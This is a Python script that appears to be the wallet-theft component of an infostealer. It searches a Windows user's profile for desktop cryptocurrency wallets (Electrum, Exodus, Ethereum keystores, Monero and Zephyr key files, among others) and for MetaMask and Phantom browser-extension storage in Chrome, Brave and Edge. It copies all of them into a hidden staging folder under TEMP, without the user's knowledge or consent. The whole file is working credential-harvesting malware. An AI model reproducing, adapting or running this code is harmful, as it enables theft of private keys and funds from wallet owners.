import os
import shutil
from pathlib import Path

folder_crypto = os.path.join(os.getenv("TEMP"), os.getenv("USERNAME").lower(), "cryptowallets")

def create_dir(path):
    os.makedirs(path, exist_ok=True)

def copy_file(src, dst):
    try:
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        shutil.copy2(src, dst)
    except Exception as e:
        print(f"Error copying file {src} to {dst}: {e}")

def copy_dir(src, dst):
    try:
        shutil.copytree(src, dst, dirs_exist_ok=True)
    except Exception as e:
        print(f"Error copying directory {src} to {dst}: {e}")

def write_to_file(file_path, content):
    try:
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'w') as f:
            f.write(content)
    except Exception as e:
        print(f"Error writing to file {file_path}: {e}")

def local_crypto_wallets():
    wallet_paths = {
        "Armory": os.path.join(os.getenv("APPDATA"), "Armory", "*.wallet"),
        "Atomic": os.path.join(os.getenv("APPDATA"), "Atomic", "Local Storage", "leveldb"),
        "Bitcoin": os.path.join(os.getenv("APPDATA"), "Bitcoin", "wallets"),
        "Bytecoin": os.path.join(os.getenv("APPDATA"), "bytecoin", "*.wallet"),
        "Coinomi": os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi", "Coinomi", "wallets"),
        "Dash": os.path.join(os.getenv("APPDATA"), "DashCore", "wallets"),
        "Electrum": os.path.join(os.getenv("APPDATA"), "Electrum", "wallets"),
        "Ethereum": os.path.join(os.getenv("APPDATA"), "Ethereum", "keystore"),
        "Exodus": os.path.join(os.getenv("APPDATA"), "Exodus", "exodus.wallet"),
        "Guarda": os.path.join(os.getenv("APPDATA"), "Guarda", "Local Storage", "leveldb"),
        "Litecoin": os.path.join(os.getenv("APPDATA"), "Litecoin", "wallets"),
        "MyMonero": os.path.join(os.getenv("APPDATA"), "MyMonero", "*.mmdbdoc_v1"),
        "Monero GUI": os.path.join(os.getenv("APPDATA"), "Documents", "Monero", "wallets"),
    }

    zephyr_path = os.path.join(os.getenv("APPDATA"), "Zephyr", "wallets")
    if os.path.exists(zephyr_path):
        for file in Path(zephyr_path).rglob("*.keys"):
            dest_file = os.path.join(folder_crypto, "Zephyr", file.name)
            copy_file(str(file), dest_file)

    for wallet_name, source_path in wallet_paths.items():
        if os.path.exists(source_path):
            dest_dir = os.path.join(folder_crypto, wallet_name)
            copy_dir(source_path, dest_dir)

def browser_wallets():
    browser_paths = {
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
    }

    wallet_dirs = {
        "nkbihfbeogaeaoehlefnkodbefgpgknn": "Metamask",
        "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
        "ejbalbakoplchlghecdalmeeeajnimhm": "Metamask2",
    }

    for browser_name, browser_path in browser_paths.items():
        if os.path.exists(browser_path):
            for root, dirs, files in os.walk(browser_path):
                if "Local Extension Settings" in root:
                    for wallet_key, wallet_name in wallet_dirs.items():
                        extension_path = os.path.join(root, wallet_key)
                        if os.path.exists(extension_path):
                            wallet_dest = os.path.join(folder_crypto, f"{wallet_name} ({browser_name})")
                            copy_dir(extension_path, wallet_dest)
                            write_to_file(os.path.join(wallet_dest, "Location.txt"), extension_path)
                            print(f"Copied {wallet_name} wallet from {extension_path} to {wallet_dest}")

def run():
    create_dir(folder_crypto)
    local_crypto_wallets()
    browser_wallets()

if __name__ == "__main__":
    run()
